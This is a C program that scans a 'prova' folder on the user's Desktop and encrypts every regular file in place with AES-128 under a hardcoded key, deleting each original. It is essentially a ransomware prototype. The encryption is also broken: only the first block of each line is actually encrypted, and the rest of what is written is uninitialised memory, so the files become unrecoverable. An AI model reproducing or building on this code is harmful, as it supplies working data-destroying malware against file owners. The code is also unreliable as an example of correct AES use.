#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <openssl/aes.h>

#define MAX_LINE_LENGTH 8192
#define MAX_LINES 100

void encrypt_file(const char *file_path, const unsigned char *aes_key) {
    FILE *fp = fopen(file_path, "r");
    if (fp == NULL) {
        printf("Error: cant read %s \n", file_path);
        return;
    }

    char temp_file_path[1024];
    snprintf(temp_file_path, sizeof(temp_file_path), "%s.temp", file_path);
    FILE *temp_fp = fopen(temp_file_path, "w");
    if (temp_fp == NULL) {
        printf("Error: cant open %s\n", temp_file_path);
        fclose(fp);
        return;
    }

    char line[MAX_LINE_LENGTH];
    while (fgets(line, sizeof(line), fp) != NULL) {
        size_t plaintext_len = strlen(line);
        size_t padded_len = ((plaintext_len + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;

        unsigned char ciphertext[padded_len];
        AES_KEY aes;
        AES_set_encrypt_key(aes_key, 128, &aes);
        AES_encrypt((const unsigned char *)line, ciphertext, &aes);

        fwrite(ciphertext, 1, padded_len, temp_fp);
    }

    fclose(fp);
    fclose(temp_fp);

    remove(file_path);
    rename(temp_file_path, file_path);
}

int main() {
    const char *home_directory = getenv("HOME");
    if (home_directory == NULL) {
        exit(1);
    }
    char desktop_directory[1024];
    snprintf(desktop_directory, sizeof(desktop_directory), "%s/Desktop", home_directory);

    DIR *directory = opendir(desktop_directory);
    if (directory == NULL) {
        exit(1);
    }

    struct dirent *file;
    while ((file = readdir(directory)) != NULL) {
        if (file->d_type == DT_DIR && strcmp(file->d_name, ".") != 0 && strcmp(file->d_name, "..") != 0) {
            char subdir_path[1024];
            snprintf(subdir_path, sizeof(subdir_path), "%s/%s", desktop_directory, file->d_name);
            
            if (strcmp(file->d_name, "prova") == 0) {
                DIR *subdir = opendir(subdir_path);
                if (subdir != NULL) {
                    struct dirent *subfile;
                    while ((subfile = readdir(subdir)) != NULL) {
                        if (subfile->d_type == DT_REG) {
                            char file_path[1024];
                            snprintf(file_path, sizeof(file_path), "%s/%s", subdir_path, subfile->d_name);

                            printf("Ciphering content of %s:\n", file_path);
                            unsigned char aes_key[] = "fiolisostancobuonanotte";
                            encrypt_file(file_path, aes_key);
                        }
                    }
                    closedir(subdir);
                }
            }
        }
    }

    closedir(directory);

    return 0;
}